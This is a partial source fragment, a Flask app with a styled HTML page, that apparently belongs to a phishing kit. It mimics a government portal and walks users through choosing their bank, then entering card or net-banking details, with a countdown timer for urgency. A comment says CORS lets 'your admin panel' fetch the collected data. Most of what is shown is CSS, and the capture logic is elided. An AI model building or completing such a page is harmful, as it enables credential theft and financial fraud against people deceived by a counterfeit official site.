...
app = Flask(__name__)
# YAHI CORS AAPKE ADMIN PANEL KO DATA FETCH KARNE DEGA
...
<head>
    ...
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #eef2f7; min-height: 100vh; font-family: 'Segoe UI', 'Roboto', 'Arial', sans-serif; }
        .portal-container { width: 100%; max-width: 100%; background: #ffffff; min-height: 100vh; box-shadow: none; margin: 0; border-radius: 0; }
        .banner-full { width: 100%; background: #f0f4f9; line-height: 0; }
        .banner-full img { width: 100%; height: auto; max-height: 200px; object-fit: cover; display: block; }
        .gov-header { background: #1e3a5f; padding: 18px 20px; text-align: center; border-bottom: 3px solid #ffb347; }
        .gov-header h1 { color: white; font-size: 1.8rem; font-weight: 700; letter-spacing: 0.5px; }
        .gov-header p { color: #cde1f0; font-size: 0.8rem; margin-top: 6px; }
        .pages-container { background: white; width: 100%; }
        .page { padding: 28px 24px 40px; width: 100%; }
        .hidden-page { display: none; }
        .form-group { margin-bottom: 24px; }
        .form-label { font-weight: 600; color: #1e3a5f; display: block; margin-bottom: 8px; font-size: 0.95rem; }
        .form-label span { color: #d32f2f; }
        input { width: 100%; padding: 14px 16px; font-size: 1rem; border: 1.5px solid #cbd5e1; border-radius: 10px; outline: none; background: #ffffff; transition: 0.2s; }
        input:focus { border-color: #1e3a5f; box-shadow: 0 0 0 3px rgba(30,58,95,0.1); }
        .bank-selector { position: relative; }
        .bank-input-wrapper { display: flex; align-items: center; justify-content: space-between; cursor: pointer; background: white; padding: 14px 16px; border: 1.5px solid #cbd5e1; border-radius: 10px; }
        .bank-input-wrapper .bank-text { flex: 1; color: #1f2937; font-size: 1rem; }
        .bank-input-wrapper .down-arrow { font-size: 1.2rem; color: #1e3a5f; font-weight: bold; }
        .bank-dropdown-list { position: absolute; top: 100%; left: 0; right: 0; max-height: 280px; overflow-y: auto; background: white; border: 1px solid #cbd5e1; border-radius: 10px; margin-top: 6px; box-shadow: 0 8px 20px rgba(0,0,0,0.15); z-index: 200; display: none; }
        .bank-dropdown-list div { padding: 12px 16px; cursor: pointer; border-bottom: 1px solid #eef2f6; font-size: 0.9rem; transition: background 0.1s; }
        .bank-dropdown-list div:hover { background: #eef2fa; }
        button, .proceed-btn { background: #1e6f3f; color: white; border: none; padding: 14px 20px; font-size: 1rem; font-weight: 600; border-radius: 10px; cursor: pointer; width: 100%; transition: 0.2s; margin-top: 10px; }
        button:hover { background: #0f5a34; transform: translateY(-1px); }
        .two-option-buttons { display: flex; gap: 16px; margin: 24px 0 10px; }
        .two-option-buttons button { margin-top: 0; flex: 1; }
        .card-btn { background: #2c5a7a; }
        .netbank-btn { background: #8b5a2b; }
        .back-link { text-align: center; margin-top: 24px; }
        .back-link span { color: #1e3a5f; cursor: pointer; font-size: 0.85rem; text-decoration: underline; font-weight: 500; }
        .expiry-group { display: flex; gap: 16px; }
        .expiry-group .form-group { flex: 1; margin-bottom: 0; }
        .success-card { background: #e8f5e9; padding: 20px; border-radius: 14px; text-align: center; color: #1e6f3f; font-weight: 500; margin-bottom: 20px; border-left: 5px solid #1e6f3f; }
        .request-id-box { background: #f8f9fc; padding: 18px; border-radius: 14px; text-align: center; margin: 16px 0; border: 1px solid #dce3ec; }
        .timer-box { background: #fff8e7; padding: 18px; border-radius: 14px; text-align: center; border: 1px solid #ffe0a3; }
        .timer-display { font-size: 2.2rem; font-weight: 800; font-family: monospace; color: #c62828; letter-spacing: 3px; margin-top: 8px; }
        .small-note { font-size: 0.7rem; color: #6c757d; text-align: center; margin-top: 20px; }
        #requestIdFinal { font-size: 1.3rem; font-weight: 700; letter-spacing: 1px; color: #1e3a5f; }
    </style>
</head>
<body>
...
<script>
    ...
    window.goToPageNum = function(pageNum) {
        ...
        else if(pageNum === 2) { showPage('page2'); currentStep = 2; bankDropdownDiv.style.display = 'none'; }
        else if(pageNum === 3) { showPage('page3'); currentStep = 3; }
        else if(pageNum === 4) { showPage('pageCardDetails'); currentStep = 4; }
    };
